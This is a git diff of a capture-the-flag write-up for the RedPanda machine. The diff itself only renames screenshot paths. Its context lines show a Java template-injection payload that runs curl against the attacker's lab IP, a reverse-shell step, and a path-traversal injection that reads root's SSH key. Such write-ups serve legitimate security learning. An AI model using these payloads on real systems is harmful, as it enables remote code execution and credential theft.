@@ -19,11 +19,11 @@ PORT     STATE SERVICE
 
 The page was some kind of search engine:
 
-![](<../../../.gitbook/assets/image%20(1153).png>)
+![](../../../.gitbook/assets/redpanda-1.png)
 
 When we search for something, it shows our result back on the screen:
 
-![](<../../../.gitbook/assets/image%20(1255).png>)
+![](../../../.gitbook/assets/redpanda-2.png)
 
 There are a few possibilities in my mind:
 
@@ -33,7 +33,7 @@ There are a few possibilities in my mind:
 
 When we use `${7*7}`, we get a unique error:
 
-![](<../../../.gitbook/assets/image%20(2175).png>)
+![](../../../.gitbook/assets/redpanda-4.png)
 
 It seems that some characters are being blocked. We can fuzz this using `wfuzz`.
 
@@ -80,14 +80,14 @@ ID           Response   Lines    Word       Chars       Payload
 
 These characters are banned, but the rest are not. This is what happens when I used `#{7*7}:`
 
-![](<../../../.gitbook/assets/image%20(2063).png>)
+![](../../../.gitbook/assets/redpanda-3.png)
 
 This confirms that SSTI works, and the payload was taken from a Freemarker cheat sheet, meaning the page runs in Java (but not necessarily FreeMarker!). We can use this payload after replacing the `$` with `*` because `#` doesn't seem to work.
 
 <pre><code><strong>*{T(java.lang.Runtime).getRuntime().exec('curl 10.10.14.13/sstirce')}
 </strong></code></pre>
 
-![](<../../../.gitbook/assets/image%20(715).png>)
+![](../../../.gitbook/assets/redpanda-7.png)
 
 From this, I will get a hit back on my Python server:
 
@@ -107,7 +107,7 @@ bash /tmp/rev
 
 Our listener port would catch a shell:
 
-![](<../../../.gitbook/assets/image%20(4001).png>)
+![](../../../.gitbook/assets/redpanda-6.png)
 
 ## Privilege Escalation
 
@@ -310,8 +310,8 @@ echo 'a||aa||aa||../../../../../../../../../../../../../tmp/read.jpg' >> redpand
 
 Then we wait for a little bit, then read the `read_creds.xml` file to find the `root` SSH key.
 
-![](<../../../.gitbook/assets/image%20(3566).png>)
+![](../../../.gitbook/assets/redpanda-5.png)
 
 Then we can `ssh` in as `root`.
 
-![](<../../../.gitbook/assets/image%20(902).png>)
+![](../../../.gitbook/assets/redpanda-8.png)
